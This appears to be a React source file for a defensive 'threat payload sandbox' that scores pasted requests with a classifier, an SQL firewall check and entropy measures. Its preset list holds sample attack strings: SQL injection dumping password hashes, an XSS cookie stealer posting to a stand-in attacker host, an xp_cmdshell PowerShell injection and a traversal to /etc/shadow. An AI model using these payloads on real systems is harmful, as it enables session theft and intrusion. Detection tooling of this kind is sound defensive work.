import React, { useState } from 'react';
import { 
  Terminal, 
  Search, 
  ShieldCheck, 
  ShieldAlert, 
  AlertTriangle, 
  Code2, 
  Fingerprint, 
  Sparkles, 
  CheckCircle2, 
  Copy, 
  Check,
  Zap
} from 'lucide-react';
import { extractPayloadFeatures } from '../data-mining/featureExtractor';
import { analyzeSQLQuery } from '../firewall/dbFirewallEngine';
import { CyberRandomForest } from '../data-mining/mlModels';
import { generateTrainingDataset } from '../data-mining/datasetGenerator';
import { threatAudio } from '../components/ThreatAudio';

export default function PayloadSandboxView() {
  const [inputPayload, setInputPayload] = useState("GET /api/v1/search?query=admin' UNION SELECT 1,password_hash,email FROM sys_users -- HTTP/1.1");
  const [copied, setCopied] = useState(false);

  // Train a quick local model instance
  const [rfModel] = useState(() => {
    const rf = new CyberRandomForest(7, 5);
    rf.train(generateTrainingDataset(4));
    return rf;
  });

  const features = extractPayloadFeatures(inputPayload);
  const sqlAnalysis = analyzeSQLQuery(inputPayload);
  const mlPrediction = rfModel.predict(features.featureVector);

  const SANDBOX_PRESETS = [
    {
      name: 'SQLi: Union Extraction',
      type: 'SQLI',
      payload: "GET /api/v1/search?query=admin' UNION SELECT 1,password_hash,email FROM sys_users -- HTTP/1.1"
    },
    {
      name: 'XSS: Cookie Stealer Hook',
      type: 'XSS',
      payload: '<script>fetch("https://attacker-c2.io/log?k=" + btoa(document.cookie))</script>'
    },
    {
      name: 'RCE / Shell Injection',
      type: 'SHELL',
      payload: "'; EXEC xp_cmdshell('powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ...') --"
    },
    {
      name: 'Path Traversal Probe',
      type: 'TRAVERSAL',
      payload: 'GET /download.php?file=../../../../../../etc/shadow HTTP/1.1'
    },
    {
      name: 'Base64 Obfuscated Smuggling',
      type: 'EXFIL',
      payload: 'POST /v2/telemetry payload=eyJldmVudCI6ICJ1c2VyX2V4ZmlsdHJhdGUiLCAiZGF0YSI6ICJTRUNSRVRfVE9LRU4ifQ=='
    },
    {
      name: 'Clean Standard API Call',
      type: 'CLEAN',
      payload: 'GET /api/v1/users/profile?id=1092&format=json HTTP/1.1'
    }
  ];

  const handleCopy = () => {
    navigator.clipboard.writeText(inputPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const isMalicious = mlPrediction.label !== 'NORMAL' || sqlAnalysis.riskScore >= 35;

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="p-4 rounded-2xl glass-panel-glow border-cyan-500/30 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div className="flex items-center gap-3.5">
          <div className="w-12 h-12 rounded-xl bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shrink-0">
            <Terminal className="w-6 h-6 animate-pulse" />
          </div>
          <div>
            <h1 className="text-lg font-bold text-white font-display tracking-wide flex items-center gap-2">
              UNIVERSAL THREAT PAYLOAD SANDBOX & DEEP AUDITOR
              <span className="text-[10px] font-mono uppercase px-2 py-0.5 rounded bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 font-semibold">
                MULTI-TIER ANALYSIS
              </span>
            </h1>
            <p className="text-xs text-slate-400">
              Paste any raw URL query, HTTP header, SQL fragment, or payload for immediate AI + AST Firewall diagnosis.
            </p>
          </div>
        </div>

        <button
          onClick={() => {
            threatAudio.playScan();
          }}
          className="px-4 py-2 rounded-xl text-xs font-mono font-bold bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 flex items-center gap-1.5 shadow-[0_0_15px_rgba(0,242,254,0.3)] transition-all"
        >
          <Sparkles className="w-3.5 h-3.5" />
          <span>Deep Scan Payload</span>
        </button>
      </div>

      {/* Input Box & Presets */}
      <div className="p-5 rounded-2xl glass-panel border-slate-800 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
          <div className="flex items-center gap-2">
            <Search className="w-4 h-4 text-cyan-400" />
            <h2 className="text-sm font-bold font-mono uppercase text-white">
              Target Payload Input
            </h2>
          </div>
          <button
            onClick={handleCopy}
            className="flex items-center gap-1 text-xs font-mono text-slate-400 hover:text-cyan-300 transition-colors"
          >
            {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
            <span>{copied ? 'Copied' : 'Copy Text'}</span>
          </button>
        </div>

        {/* Preset Chips */}
        <div className="flex flex-wrap gap-2">
          {SANDBOX_PRESETS.map((preset, i) => (
            <button
              key={i}
              onClick={() => {
                setInputPayload(preset.payload);
                threatAudio.playScan();
              }}
              className={`px-2.5 py-1 rounded-lg text-[11px] font-mono font-semibold transition-colors border ${
                preset.type === 'CLEAN'
                  ? 'bg-emerald-950/40 hover:bg-emerald-900/60 text-emerald-300 border-emerald-700/40'
                  : 'bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border-rose-700/40'
              }`}
            >
              {preset.name}
            </button>
          ))}
        </div>

        {/* Textarea */}
        <div className="space-y-1.5 font-mono">
          <textarea
            value={inputPayload}
            onChange={(e) => setInputPayload(e.target.value)}
            rows={4}
            placeholder="Enter raw payload string to analyze..."
            className="w-full p-3.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500/60 shadow-inner"
          />
        </div>
      </div>

      {/* Multi-Tier Diagnostic Breakdown Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Tier 1: Machine Learning Verdict */}
        <div className="p-5 rounded-2xl glass-panel border-slate-800 space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold font-mono uppercase text-slate-300 flex items-center gap-1.5">
              <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
              Tier 1: AI Model Verdict
            </h3>
            <span className="text-[10px] font-mono text-cyan-400">RANDOM FOREST</span>
          </div>

          <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800/90 space-y-2">
            <div className="flex justify-between items-center">
              <span className="text-xs font-mono text-slate-400">Predicted Class:</span>
              <span className={`px-2 py-0.5 rounded text-xs font-bold font-mono border ${
                mlPrediction.label === 'NORMAL' ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40' : 'bg-rose-500/20 text-rose-300 border-rose-500/40'
              }`}>
                {mlPrediction.label}
              </span>
            </div>
            <div className="flex justify-between items-center text-xs font-mono">
              <span className="text-slate-400">Model Confidence:</span>
              <span className="text-cyan-300 font-bold">{(mlPrediction.confidence * 100).toFixed(1)}%</span>
            </div>
          </div>
          <p className="text-[11px] font-mono text-slate-400">
            Multi-tree ensemble evaluated against normalized 7-feature payload vector.
          </p>
        </div>

        {/* Tier 2: DB Sentinel AST Firewall Verdict */}
        <div className="p-5 rounded-2xl glass-panel border-slate-800 space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold font-mono uppercase text-slate-300 flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-purple-400" />
              Tier 2: DB Firewall AST Verdict
            </h3>
            <span className="text-[10px] font-mono text-purple-400">AST LEXICAL</span>
          </div>

          <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800/90 space-y-2">
            <div className="flex justify-between items-center">
              <span className="text-xs font-mono text-slate-400">Firewall Decision:</span>
              <span className={`px-2 py-0.5 rounded text-xs font-bold font-mono border ${
                sqlAnalysis.verdict === 'ALLOW' ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40' : 'bg-rose-500/20 text-rose-300 border-rose-500/40'
              }`}>
                {sqlAnalysis.verdict}
              </span>
            </div>
            <div className="flex justify-between items-center text-xs font-mono">
              <span className="text-slate-400">Calculated Risk Score:</span>
              <span className="text-purple-300 font-bold">{sqlAnalysis.riskScore} / 100</span>
            </div>
          </div>
          <p className="text-[11px] font-mono text-slate-400">
            Matched {sqlAnalysis.matchedRules.length} security heuristic rules.
          </p>
        </div>

        {/* Tier 3: Zero-Day Anomaly Score */}
        <div className="p-5 rounded-2xl glass-panel border-slate-800 space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold font-mono uppercase text-slate-300 flex items-center gap-1.5">
              <Zap className="w-3.5 h-3.5 text-amber-400" />
              Tier 3: Anomaly & Entropy
            </h3>
            <span className="text-[10px] font-mono text-amber-400">SHANNON H(X)</span>
          </div>

          <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800/90 space-y-2">
            <div className="flex justify-between items-center text-xs font-mono">
              <span className="text-slate-400">Shannon Entropy:</span>
              <span className="text-amber-300 font-bold">{features.entropy} bits/char</span>
            </div>
            <div className="flex justify-between items-center text-xs font-mono">
              <span className="text-slate-400">Special Char Density:</span>
              <span className="text-rose-400 font-bold">{(features.specialRatio * 100).toFixed(1)}%</span>
            </div>
          </div>
          <p className="text-[11px] font-mono text-slate-400">
            High entropy indicates encrypted, packed, or polymorphic payload strings.
          </p>
        </div>
      </div>

      {/* Remediation & Defensive Patching Card */}
      <div className="p-5 rounded-2xl glass-panel border-slate-800 space-y-3">
        <h2 className="text-sm font-bold font-mono uppercase text-white flex items-center gap-2">
          <Code2 className="w-4 h-4 text-emerald-400" />
          Defensive Hardening Recommendation
        </h2>

        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono space-y-2">
          <div className="text-emerald-400 font-bold">
            {isMalicious ? '⚠️ ACTION REQUIRED: THREAT MITIGATION PROTOCOL' : '✅ CLEAN PAYLOAD: CONFORMS TO PROTOCOL'}
          </div>
          <p className="text-slate-300 text-[11px]">
            {isMalicious
              ? 'Sanitize all input data using strict parameterization. Enforce Content Security Policy (CSP) headers, isolate SQL queries using ORM prepared statements, and rate-limit repeat offender IP addresses.'
              : 'Payload matches expected nominal parameters. No mitigation actions needed.'}
          </p>
        </div>
      </div>
    </div>
  );
}
